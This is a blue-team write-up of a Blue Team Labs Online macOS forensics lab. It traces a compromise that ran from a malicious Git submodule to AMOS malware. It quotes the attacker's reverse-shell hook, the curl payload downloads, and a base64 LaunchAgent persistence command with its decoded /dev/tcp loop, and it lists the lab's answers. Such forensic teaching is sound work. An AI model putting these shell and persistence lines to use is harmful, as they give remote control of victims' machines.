# 🚨 Mac Updater Investigation

---

## 🎯 Objective
Conduct a macOS-focused digital forensic investigation following a SIEM alert related to a suspicious crashed process on an employee workstation. Analyze system artifacts, persistence mechanisms, and indicators of compromise to determine whether the host was compromised.

---

## 🧾 Lab Details
- **Platform:** Blue Team Labs Online (BTLO)  
- **Lab:** Mac Updater  
 - **Difficulty:** Medium  
- **OS:** Windows 
- **Category:** Digital Forensics And Incident Response  

---

## 📖 Scenario
During a routine monitoring operation, the SOC team received a SIEM alert indicating that an unknown process unexpectedly crashed on Khaled Allam’s MacBook, part of the EZ-CERT network.

When questioned, Khaled denied any knowledge of the process or its origin. The incident prompted a rapid triage of the device to identify potential indicators of compromise, persistence mechanisms, or suspicious activity.

The objective of the investigation was to determine whether the system had been compromised and ensure no malicious artifacts remained on the host.

---

## 🛠️ Tools Used
- UnifiedLogReader  
- Spotlight Parser  
- SQLite3  
- MRU Parser  
- FSE Parser  

---

## 🔎 Investigation Overview
The investigation focused on identifying suspicious activity on the macOS system, tracing potentially malicious repositories, analyzing persistence mechanisms, and uncovering command-and-control communication.

By correlating Spotlight artifacts, Git repositories, filesystem activity, and script analysis, it was possible to reconstruct the attack chain and identify the malicious behavior executed on the host.

---

## Lab Discovery

In this lab, we are analyzing a macOS system following a SIEM alert related to an unknown crashed process.

The investigation focuses on identifying suspicious repositories cloned on the system, tracing malicious code execution, identifying command-and-control communication, and determining whether persistence mechanisms were established.

---

## 🔍 Investigation Process

In most macOS DFIR investigations, I usually start by parsing the Unified Logs, FSEvents, Spotlight databases, and MRU artifacts to prepare them for analysis.

### Commands used for parsing:

```bash
.\unifiedlog_iterator.exe --mode log-archive --input "C:\Users\BTLOTest\Desktop\Artefacts\EZ-CERT_20251027_120253\EZ-CERT-Triage\UnifiedLogs\EZ-CERT_20251027_120253.logarchive" --format csv --output logs.csv
python3 FSEParser_V4.1.py -s "/mnt/c/Users/BTLOTest/Desktop/Artefacts/EZ-CERT_20251027_120253/EZ-CERT-Triage/fsevents/.fseventsd" -o "/mnt/c/Users/BTLOTest/Desktop/FSE_Output" -t folder
python2 macMRU.py "/mnt/c/Users/BTLOTest/Desktop/Artefacts/EZ-CERT_20251027_120253/EZ-CERT-Triage/Users/khaled.allam/Library/Application-Support/com.apple.sharedfilelist" --blob_parse_human > Output.txt
python3 spotlight_parser.py "/mnt/c/Users/BTLOTest/Desktop/Artefacts/EZ-CERT_20251027_120253/EZ-CERT-Triage/spotlight/.Spotlight-V100/Store-V2/C0DFC1E3-3C5F-4980-8054-0BF40FCF0308/.store.db" "/mnt/c/Users/BTLOTest/Desktop/spot/"
```

Q1) While reviewing Khaled’s workspace, you discover he cloned a GitHub repository that appears tied to his workflow. What is the repository’s full URL?

For the first question, I usually start by checking command history to identify recently executed commands and suspicious activity.
However, during the investigation, I found a useful lead inside the spotlight-store_data.txt file after searching for the keyword:
***clone***
This revealed a GitHub cloning command along with the repository URL, as shown below:

***Workflow Tools??Small collection of helper scripts and utilities used to prepare a workspace, package artifacts, and generate simple reports. Intended for onboarding and light automation tasks.??## Quick start??```bash??# clone repo??git clone --recursive https://github.com/AbuTrikaa/workflow-tools***

From this artifact, I identified the repository cloned on the system.

<img width="1545" height="806" alt="Mac Updater-Q1" src="https://github.com/user-attachments/assets/17bee7bb-66e4-4f8f-af3f-6e2b99b6cca7" />

***Answer ==> https://github.com/AbuTrikaa/workflow-tools***

Q2) When exactly did Khaled (or whoever used his account) clone that repository?

From the repository URL discovered in the previous question, I identified the repository name:
***workflow-tools**

I then searched for this keyword within the same spotlight-store_data.txt file and found metadata entries related to the cloned repository.
The following values revealed the repository creation timestamp:

_kMDItemDisplayNameWithExtensions --> workflow-tools

kMDItemContentCreationDate --> 2025-10-27 18:25:18.702052

This timestamp indicates when the repository was cloned onto the system.

<img width="1545" height="807" alt="Mac Updater-Q2" src="https://github.com/user-attachments/assets/9ac2620c-1e93-4977-b1c3-d164f35d2607" />


***Answer ==> 2025-10-27 18:25:18.702***

Q3) The cloned repository references another repository that actually hosts the malicious code. What is the full URL of that external repository?

To continue the investigation, I navigated to the cloned repository directory located at:

\Users\khaled.allam\Downloads\workflow-tools

Inside the repository, I reviewed the .gitmodules file to check whether any external repositories or submodules were referenced.

There, I found the following URL:

***url = https://github.com/NotMoSala/TotallyNormal.git***

This confirmed that the repository was linked to another GitHub repository hosting the malicious code.

<img width="1548" height="842" alt="Mac Updater-Q3" src="https://github.com/user-attachments/assets/4e602f2e-f5b3-4a35-9bc5-aaa868d13b21" />


Answer ==> https://github.com/NotMoSala/TotallyNormal

Q4) Right after the repository was cloned, the host reached back to a remote command-and-control server. Provide the IP and port of that C2.


Since the TotallyNormal repository appeared to contain the malicious functionality, I continued analyzing its contents for suspicious scripts and execution behavior.
During the review, I found a malicious post-checkout Git hook containing a reverse shell command:

```bash
#!/usr/bin/env bash
touch /tmp/khaled
/bin/bash -c bash -i >& /dev/tcp/63.177.84.139/41143 0>&1***
```
This command establishes a reverse shell connection to a remote command-and-control server.

From the script, I identified the following C2 IP address and port:

<img width="1913" height="982" alt="Mac Updater-Q4" src="https://github.com/user-attachments/assets/0de72598-12ab-48c0-8767-1125d63edddc" />


Answer ==> 63.177.84.139:41143

Q5) We’re fairly confident the attacker obtained remote code execution, but we don’t know exactly how. Which CVE did they exploit on Khaled’s machine?

As discovered in the previous questions, the malicious functionality originated from the external GitHub repository referenced inside the .gitmodules file:

https://github.com/NotMoSala/TotallyNormal

Since this repository hosted the malicious code used during the intrusion, I continued analyzing its contents to identify how remote code execution was achieved on Khaled’s machine.

While reviewing the repository files and associated exploit references, I identified the CVE leveraged by the attacker to obtain remote code execution on the target system.

<img width="1897" height="923" alt="Mac Updater-Q5" src="https://github.com/user-attachments/assets/98555f33-bd84-44cb-8f30-40b7524d1e6e" />

***Answer ==> CVE-2025-48384***

Q6) The attacker ran a quick check to confirm access using a common command. When did that command execute?

After attackers gain initial access to a system, one of the most common commands they execute is:

***whoami***

This command allows the attacker to verify the current user context and confirm successful code execution on the compromised host.

To identify when this occurred, I reviewed the parsed Unified Logs and searched for executions related to the whoami command.

From the logs, I identified the execution timestamp associated with the attacker’s verification activity.

<img width="1547" height="807" alt="Mac Updater-Q6" src="https://github.com/user-attachments/assets/8bb124f5-fac6-415a-a22f-6d9a9d2f8ac8" />

***Answer ==> 2025-10-27 18:26:00***

Q7) During the attacker’s first session, the attacker leveraged an existing tool to stabilize their shell. What was the process ID (PID) of that shell?

After gaining access, the attacker stabilized their shell by launching:

***/bin/bash***

This is a common technique used to obtain a more interactive and reliable shell session after initial code execution.

While reviewing the Unified Logs, I identified the execution of /bin/bash at:

***2025-10-27T18:26:32.881Z***

The associated process ID for that shell session was:

<img width="1547" height="809" alt="Mac Updater-Q7" src="https://github.com/user-attachments/assets/0e2f4e0d-fdb9-4409-b496-73cb87c9646f" />


***Answer ==> 1198***

Q8) The attacker dropped a script to establish persistence. What is the inode number of that script?

For this question, I decided to review the attacker’s command activity to identify any scripts dropped onto the system for persistence purposes.

During the analysis, I found the following commands showing a script being downloaded into the /tmp directory:
```bash
cd /tmp
ls
curl -o update.sh https://file.abelix.club/ngjx-/updater.sh
```
This revealed a suspicious script named:

***update.sh***

Since the question asked for the inode number of the persistence script, I pivoted to the parsed FSEvents data.

By filtering for:

Filename: update.sh
Path: /tmp

I was able to identify the inode associated with the dropped persistence script.

<img width="1547" height="814" alt="Mac Updater-Q8" src="https://github.com/user-attachments/assets/577e0683-d117-4cfc-867e-82cab9561fdc" />


****Answer ==> 192019****

## Q9) When did that persistence trigger for the first time initiating connection back to the C2 server?

After obtaining interactive access, the attacker created a persistence script named `update.sh` (inode `192019`) to maintain access to the compromised macOS host.

A few minutes after the initial intrusion activity, the Unified Logs recorded another execution of:

```bash
/bin/bash
```
at the following timestamp:

**2025-10-27T18:28:29.248Z**

This execution occurred after the attacker’s original session activity and is consistent with the persistence mechanism automatically triggering in the background.

The newly spawned shell activity confirmed that the persistence mechanism had successfully executed for the first time.

This behavior indicates the attacker no longer needed to manually reconnect, as the persistence mechanism could automatically restore access to the compromised system.

<img width="1548" height="802" alt="Mac Updater-Q9" src="https://github.com/user-attachments/assets/ba83f56b-c7c7-43bf-929b-aa1958616cfd" />


***Answer ==> 2025-10-27 18:28:29***

---

## Q10) For persistence, the attacker established a new, separate connection to a different C2 server to avoid detection. What is the IP and port for this secondary, persistent C2 channel?

For this question, I decided to investigate common macOS persistence locations commonly abused by attackers.

One of the most common persistence mechanisms on macOS involves the use of:

```text
LaunchAgents
```
So I navigated to the following path:

\Users\khaled.allam\Library\LaunchAgents

Inside this directory, I identified a suspicious plist file named:

com.apple.softwareupdated.helper.plist

While reviewing its contents, I found the following encoded command:

***<string>sleep 60; echo "YmFzaCAtYyAiZXhlYyA1PD4vZGV2L3RjcC8zLjEyMi4yNDIuMjI1LzQxMTQ4OyB3aGlsZSByZWFkIGxpbmUgMDwmNTsgZG8gZXZhbCBcIlwkbGluZVwiIDI+JjUgPiY1OyBkb25lIgo=" | base64 -d | bash</string>***

The command uses Base64 encoding, so I decoded the payload to reveal its actual behavior.

Decoded content:

***bash -c "exec 5<>/dev/tcp/3.122.242.225/41148; while read line 0<&5; do eval \"\$line\" 2>&5 >&5; done"***

This revealed a second persistent command-and-control communication channel established by the attacker.

<img width="1546" height="806" alt="Mac Updater-Q10" src="https://github.com/user-attachments/assets/92f9552b-4b5e-49a7-9e42-35523b19837d" />

***Answer ==> 3.122.242.225:41148***

Q11) The attacker eventually dropped a final binary onto Khaled’s machine. When was that file written to disk?

For this question, I first reviewed the attacker’s command history to identify additional payloads dropped onto the system.

During the analysis, I found the following commands:

```bash
curl -o updater.macho https://file.abelix.club/5HQCx/updater.macho
chmod +x updater.macho
ls
./updater.macho
./updater.macho
```
This indicated that the attacker downloaded and executed a binary named:

updater.macho

To identify when the file was created, I searched for the filename within the Spotlight artifacts and found the following metadata:

_kMDItemCreationDate --> 2025-10-27 18:37:20.366252

_kMDItemDisplayNameWithExtensions --> updater.macho_564D7A8E-C169-BFE6-7153-402026418B0E.plist

This clearly showed when the file metadata was indexed by Spotlight.

However, to identify the exact time the binary was written to disk, I decided to dig deeper into the Full_file_listing.txt artifact.

After searching for updater.macho, I found the following entry:

/private/tmp:
-rwxr-xr-x  1 khaled.allam  wheel  236544 Oct 27 11:34 updater.macho

The timestamp shown was in Pacific Time, so I converted it to UTC by adding 7 hours.

This provided the correct timestamp for when the file was written to disk.

<img width="1547" height="808" alt="Mac Updater-Q11" src="https://github.com/user-attachments/assets/2c118f78-cc12-4687-aff2-c7159281296f" />

***Answer ==> 2025-10-27 18:34***

Q12) That final file executed multiple times and crashed each time. Provide the PIDs for all of the attacker tries.

For this question, the best approach was to investigate the parsed Unified Logs to identify crash activity related to the final binary.

I started by searching the logs for:

updater.macho

This revealed multiple execution attempts associated with the binary, along with crash-related events.

From the Unified Logs, I identified the process IDs tied to the attacker’s execution attempts.

<img width="1549" height="809" alt="Mac Updater-Q12" src="https://github.com/user-attachments/assets/897cf44c-2e88-4ab8-8f7c-5230a4116f5c" />

***Answer ==> 1300_1351***

Q13) Based on the alert metadata, what is the malware family name assigned to the final binary?

For the final question, I reviewed the alert artifact provided with the lab.

The alert metadata contained several useful details, including:

Timestamp
Filename
File hash
Detection information

The following hash was associated with the final binary:

***566b53847688d80d901130baf84d349c***

To identify the malware family, I performed OSINT research using the provided hash.

The results identified the malware family associated with the binary as:

<img width="1550" height="839" alt="Mac Updater-Q13-p1" src="https://github.com/user-attachments/assets/5eceda03-df1b-4678-82a3-686d40ae34e9" />

<img width="1912" height="926" alt="Mac Updater-Q13-p2" src="https://github.com/user-attachments/assets/a5f6b921-5e79-496a-9c0f-3049f5002a17" />

***Answer ==> amos***

---

## Conclusion

This investigation showed how a seemingly normal GitHub repository can quickly turn into a full compromise on a macOS system.

By analyzing Spotlight artifacts, Unified Logs, FSEvents, LaunchAgents, and command activity, I was able to trace the attacker’s actions from the initial repository clone all the way to persistence and execution of the final malicious binary.

The attacker established multiple C2 channels, maintained persistence using LaunchAgents, and eventually deployed an AMOS payload on the system.

Overall, this lab was a really good example of how attackers can abuse developer workflows and trusted tools to gain and maintain access on macOS environments.

---

<img width="915" height="815" alt="MacUpdater-Done" src="https://github.com/user-attachments/assets/760669c0-8a18-4603-bff0-22f57c4fe2e4" />


